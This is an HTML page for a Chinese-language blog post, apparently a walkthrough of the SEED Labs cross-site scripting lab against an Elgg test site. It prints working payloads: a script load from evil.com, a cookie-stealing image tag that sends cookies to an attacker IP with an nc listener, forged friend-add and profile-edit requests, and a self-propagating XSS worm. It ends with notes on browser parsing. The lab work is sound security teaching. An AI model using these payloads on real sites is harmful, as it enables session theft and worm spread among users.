@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Snake_32px.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Snake_16px.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Snake.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="跨站脚本攻击（Cross Site Scripting）概念&amp;emsp;&amp;emsp;通过插入恶意脚本代码来窃取用户信息，获取用户权限以及 配合其他漏洞发动更加复杂的攻击。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。&amp;emsp;&amp;emsp;XSS 漏洞根据表现形式的不同，主要有以下三种类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seedlab-web.md">
+<meta property="og:url" content="http://yoursite.com/2019/Web/seedlabs-web/index.html">
+<meta property="og:site_name" content="SsatanS">
+<meta property="og:description" content="跨站脚本攻击（Cross Site Scripting）概念&amp;emsp;&amp;emsp;通过插入恶意脚本代码来窃取用户信息，获取用户权限以及 配合其他漏洞发动更加复杂的攻击。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。&amp;emsp;&amp;emsp;XSS 漏洞根据表现形式的不同，主要有以下三种类型">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/decode.jpg">
+<meta property="og:updated_time" content="2020-05-29T06:43:35.470Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="seedlab-web.md">
+<meta name="twitter:description" content="跨站脚本攻击（Cross Site Scripting）概念&amp;emsp;&amp;emsp;通过插入恶意脚本代码来窃取用户信息，获取用户权限以及 配合其他漏洞发动更加复杂的攻击。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。&amp;emsp;&amp;emsp;XSS 漏洞根据表现形式的不同，主要有以下三种类型">
+<meta name="twitter:image" content="http://yoursite.com/images/decode.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/Web/seedlabs-web/">
+
+
+
+
+
+  <title>seedlab-web.md | SsatanS</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SsatanS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Stay Hungry</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/categories/ctf/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag-checkered"></i> <br>
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/Pwn/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-product-hunt"></i> <br>
+            
+            Pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br>
+            
+            Web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wifi">
+          <a href="/categories/wifi" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wifi"></i> <br>
+            
+            Wifi
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-others">
+          <a href="/categories/others/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-list"></i> <br>
+            
+            Others
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/Web/seedlabs-web/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="失神我醉了">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/iam.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SsatanS">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">seedlab-web.md</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-28T15:37:34+08:00">
+                2019-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="跨站脚本攻击（Cross-Site-Scripting）"><a href="#跨站脚本攻击（Cross-Site-Scripting）" class="headerlink" title="跨站脚本攻击（Cross Site Scripting）"></a>跨站脚本攻击（Cross Site Scripting）</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>&emsp;&emsp;通过插入恶意脚本代码来窃取用户信息，获取用户权限以及 配合其他漏洞发动更加复杂的攻击。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。<br>&emsp;&emsp;XSS 漏洞根据表现形式的不同，主要有以下三种类型。</p>
+<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>XSS代码作为输入提交到服务端，服务端解析响应后，在响应内容出现这段代码，最后被游览器解析执行。过程像一次反射。</p>
+<h4 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h4><p>XSS攻击代码持久化储存在服务端中，当任意用户访问漏洞页面时，将触发恶意代码。</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>与前两种不同，XSS代码的执行只在客户端，依靠游览器的DOM解析，不需要服务器解析响应的参与。</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>挂马，盗取用户cookie，DOS，钓鱼，病毒，蠕虫。</p>
+<h4 id="seedlabs-XSS-相关内容"><a href="#seedlabs-XSS-相关内容" class="headerlink" title="seedlabs-XSS 相关内容"></a>seedlabs-XSS 相关内容</h4><p>• Cross-Site Scripting attack<br>• XSS worm and self-propagation<br>• Session cookies<br>• HTTP GET and POST requests<br>• JavaScript and Ajax</p>
+<h4 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h4><h5 id="Task1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task1: Posting a Malicious Message to Display an Alert Window"></a>Task1: Posting a Malicious Message to Display an Alert Window</h5><p>&emsp;&emsp;登录用户（eg:Boby),在其profile的brief description 区域写入下列JavaScript代码。任意用户访问Boby的profile将弹窗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(’XSS’);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;如果输入区域有长度限制，而我们的js代码太长，可以将js代码写到js文件中，然后调用，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;</span><br><span class="line">src=&quot;http://www.evil.com/evil.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="Task2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task2: Posting a Malicious Message to Display Cookies"></a>Task2: Posting a Malicious Message to Display Cookies</h5><p>&emsp;&emsp;在任务1同样地方，可以嵌入下列js code，用户自己的cookie将被弹窗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h4><p>&emsp;&emsp;任务2只能显示用户自己的cookie，那么怎样盗取别人的cookie呢？我们可以通过XSS漏铜，嵌入恶意js请求，使用<img> tag,发送GET请求，将用户cookie发送到攻击者服务器，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;document.write(&apos;&lt;img src=&quot;http://10.10.10.9:5555?c=&apos;+encodeURI(document.cookie) +&apos;&gt;&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以用nc监听5555端口，显示cookie。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 5555 -v</span><br></pre></td></tr></table></figure></p>
+<h4 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h4><p>&emsp;&emsp;任务要求写一个XSS worm 使得任意访问Samy’s page的用户将自动添加Samy为好友。首先我们在游览器按F12观察add friend发送的请求，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/friends/add?friend=47&amp;__elgg_ts=1590717097&amp;__elgg_token=XOt_md4I7Ly9Hjtv3CIltw</span><br></pre></td></tr></table></figure></p>
+<p>47: 要加好友的用户id, <strong>elgg_ts,</strong>elgg_token 标明本用户身份。那么我们可以伪造该请求，使任意访问Samy页面的用户，加Samy为好友，代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">  	var Ajax = null;</span><br><span class="line">	var ts = &quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts;</span><br><span class="line">      	var token = &quot;&amp;__elgg_token=&quot;+elgg.security.token.__elgg_token;</span><br><span class="line">      	//Construct the HTTP request to add Samy as a friend.</span><br><span class="line">        var sendurl = &quot;http://www.xsslabelgg.com/action/friends/add?friend=47&quot;+ts+token;</span><br><span class="line">	//Create and send Ajax request to add friend</span><br><span class="line">	Ajax = new XMLHttpRequest();</span><br><span class="line">	Ajax.open(&quot;GET&quot;,sendurl,true);</span><br><span class="line">	Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</span><br><span class="line">	Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">	Ajax.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>将代码嵌入Samy‘s profile的”About me”字段，这个字段有两个模式editor和Text mode（通过点击“Edit HTML”），仅Text mode 可以执行js 代码，js会被嵌入到文本中，而Editor模式，特殊字符会被编码。</p>
+<h4 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h4><p>&emsp;&emsp;我们按游览器F12,看一下正常编辑用户profile时，发送HTTP Post请求时会发送那些参数，然后伪造，也可以用burpsuit截获请求，增减参数，看哪些是必须的，js代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=&quot;worm&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">var userName = elgg.session.user.name;</span><br><span class="line">var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;</span><br><span class="line">var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;</span><br><span class="line">var token = &quot;__elgg_token=&quot; + elgg.security.token.__elgg_token;</span><br><span class="line">var content = token + ts + &quot;name=&quot;+ userName +&quot;&amp;description=test&quot;+ guid; </span><br><span class="line">var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;; </span><br><span class="line">var samyGuid=47; </span><br><span class="line">if(elgg.session.user.guid!=samyGuid) &#123; </span><br><span class="line">//Create and send Ajax request to modify profile </span><br><span class="line">var Ajax=null; </span><br><span class="line">Ajax=new XMLHttpRequest();</span><br><span class="line"> Ajax.open(&quot;POST&quot;,sendurl,true); </span><br><span class="line"> Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;); </span><br><span class="line"> Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); </span><br><span class="line"> Ajax.send(content); </span><br><span class="line"> &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="Task 6: Writing a Self-Propagating XSS Worm"></a>Task 6: Writing a Self-Propagating XSS Worm</h4><p>&emsp;&emsp;自我传播式蠕虫，任意访问Samy页面的用户，将被嵌入同样的蠕虫代码。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=&quot;worm&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">var userName = elgg.session.user.name;</span><br><span class="line">var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;</span><br><span class="line">var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;</span><br><span class="line">var token = &quot;__elgg_token=&quot; + elgg.security.token.__elgg_token;</span><br><span class="line">var headerTag = &quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;;</span><br><span class="line">var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;</span><br><span class="line">var tailTag = &quot;&lt;/&quot; +&quot;script&gt;&quot;;</span><br><span class="line">var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); </span><br><span class="line">var content = token + ts + &quot;name=&quot;+ userName +&quot;&amp;description=&quot;+wormCode+ guid; </span><br><span class="line">var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;; </span><br><span class="line">var samyGuid=47; </span><br><span class="line">if(elgg.session.user.guid!=samyGuid) &#123; </span><br><span class="line">//Create and send Ajax request to modify profile </span><br><span class="line">var Ajax=null; </span><br><span class="line">Ajax=new XMLHttpRequest();</span><br><span class="line"> Ajax.open(&quot;POST&quot;,sendurl,true); </span><br><span class="line"> Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;); </span><br><span class="line"> Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); </span><br><span class="line"> Ajax.send(content); </span><br><span class="line"> &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="Task-7-Countermeasures"><a href="#Task-7-Countermeasures" class="headerlink" title="Task 7: Countermeasures"></a>Task 7: Countermeasures</h4><p>&emsp;&emsp;本质上一切的安全问题是与输入相关的，只要我们可以构造不同的输入，而系统能给我们不一样的输出，一旦系统存在漏洞，那么我们就可以为所欲为。在讨论XSS防御前，我们需要先了解<strong>游览器解析html</strong>的过程。否则不容易理解防御，也不容易理解攻击绕过。</p>
+<h5 id="游览器解码过程"><a href="#游览器解码过程" class="headerlink" title="游览器解码过程"></a>游览器解码过程</h5><p>&emsp;&emsp;游览器在解析HTML时，主要有这几个过程：HTML解析、CSS解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。<br><img src="/images/decode.jpg" alt="(盗图...)"><br>  从图中可以看出浏览器主要做了三部分的工作。<br>  1. HTML/SVG/XHTML 解析。解析这三种文件会产生一个DOM Tree。<br>  2. CSS 解析，解析CSS会产生CSS规则树。<br>  3. Javascript 解析。（暂时讨论JavaScript动态操作DOM Tree）。<br>  4. URL解析。（这一步的先后顺序不一定，看语境）<br>&emsp;&emsp;服务器返回游览器数据时，浏览器需要识别这一长串数据中哪些是文本字符（浏览器不需要解析，只需要显示出来），哪些是控制字符（对于HTML来说就是能够被解析为DOM Tree的字符）。作为攻击者，尽可能将用户输入的值让浏览器识别为控制字符，这样就可以造成XSS漏铜利用。<br>&emsp;&emsp;我们的游览器在解析html时，会把<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = 1/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这个标签解析为6个符号token,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;    img    src    =    1   /   &gt;</span><br></pre></td></tr></table></figure></p>
+<p>解析过程如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.    在解析&lt;这个符号以前，状态是Data State</span><br><span class="line">2.    然后解析到&lt;的时候，解析状态变为Tag open state，然后开始搜寻标签名，（在搜寻标签名的时候，我们要思考一个问题，&lt;和标签名img并不是同一个token，他们显然是分别进行解析的，那么有没有可能忽略掉&lt;和img之间的空格或者换行什么的？这个问题，我相信很好找到答案。）</span><br><span class="line">3.    找到标签名，状态变为Tag name state，这个状态就表示已经识别了标签名，</span><br><span class="line">4.    然后知道读取到最近的一个&gt;时，结束tag name state的状态，重新进入Data State</span><br></pre></td></tr></table></figure></p>
+<p>标签的闭合与之类似，但是解析过程比较松散，所以有时不要闭合标签也可以解析。</p>
+<h5 id="HTML编码与解析"><a href="#HTML编码与解析" class="headerlink" title="HTML编码与解析"></a>HTML编码与解析</h5><p>HTML实体编码的出现，解决了一个问题，例如&lt;和&gt;这两个符号在HTML文档中出现是非常不安全的，因为这标志着标签的开始和结束，为了安全使用这些保留字符。开发人员使用了一套叫实体编码的编码策略，这类编码以&amp;开头，以分号;结尾<br>html编码：“&amp;#数字“，“&amp;#x十六进制”，“&amp;#unicode”–&gt; eg: &amp;#128569<br>那么html的解析发生在哪里？哪里又不能解析呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解析：HTML编码要在Data state（标签外部和标签的text段）和标签内的属性值的位置解析，</span><br><span class="line">不解析，只显示文本：Tagname/open/close state，在这三个状态中，HTML编码不会被解码的</span><br><span class="line">特殊模式下，即使Data State 也不会解析。特殊模式：&lt;style&gt;&lt;script&gt;&lt;textarea&gt;&lt;xmp&gt;。他们得text段不能被hTML编码解析。</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>走过路过，不要错过。。。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/mmqrcode.png" alt="失神我醉了 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/Pwn/pwnable-kr-input2/" rel="next" title="pwnable.kr-input2">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-input2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/Web/DNS Attack/" rel="prev" title="DNS Attack">
+                DNS Attack <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/iam.jpg" alt="失神我醉了">
+            
+              <p class="site-author-name" itemprop="name">失神我醉了</p>
+              <p class="site-description motion-element" itemprop="description">impossible,just do it</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/shishenwozuile" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5704969341" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shishenwozuile@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/parrot__bird" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
